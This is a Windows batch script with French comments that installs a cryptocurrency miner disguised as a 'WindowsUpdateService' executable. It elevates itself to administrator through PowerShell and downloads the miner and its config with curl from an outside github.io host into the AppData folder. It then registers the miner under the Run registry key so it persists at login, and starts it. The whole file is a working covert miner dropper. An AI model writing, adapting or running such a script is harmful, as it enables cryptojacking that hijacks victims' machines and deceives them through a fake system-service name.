@echo off
:: Définir les variables
setlocal enabledelayedexpansion
set miner_url=https://outof-ctrl.github.io/Outof-repo/WindowsUpdateService.exe
set config_url=https://outof-ctrl.github.io/Outof-repo/config.json
set target_dir=%APPDATA%\WinUS
set log_file=%TEMP%\miner_install_log.txt

:: Vérifier les droits administratifs
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo [ERREUR] Ce script nécessite des droits administratifs. Relancement... >> %log_file%
    powershell -Command "Start-Process cmd -ArgumentList '/c %~f0' -Verb runAs"
    exit
)

:: Créer le répertoire cible
if not exist "%target_dir%" (
    mkdir "%target_dir%"
    echo [INFO] Répertoire %target_dir% créé. >> %log_file%
)

:: Télécharger le mineur et le fichier de configuration
echo [INFO] Téléchargement du mineur... >> %log_file%
curl -o "%target_dir%\WindowsUpdateService.exe" %miner_url%
if %errorlevel% neq 0 (
    echo [ERREUR] Échec du téléchargement du mineur. >> %log_file%
    exit
)
echo [INFO] Téléchargement du fichier de configuration... >> %log_file%
curl -o "%target_dir%\config.json" %config_url%
if %errorlevel% neq 0 (
    echo [ERREUR] Échec du téléchargement du fichier de configuration. >> %log_file%
    exit
)

:: Ajouter au démarrage
echo [INFO] Ajout du mineur au démarrage... >> %log_file%
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdateService" /d "%target_dir%\WindowsUpdateService.exe --config %target_dir%\config.json" /f
if %errorlevel% neq 0 (
    echo [ERREUR] Impossible d'ajouter au démarrage. >> %log_file%
    exit
)

:: Lancer le mineur
echo [INFO] Lancement du mineur... >> %log_file%
start "" "%target_dir%\WindowsUpdateService.exe" --config "%target_dir%\config.json"

echo [SUCCES] Installation terminée. >> %log_file%
exit
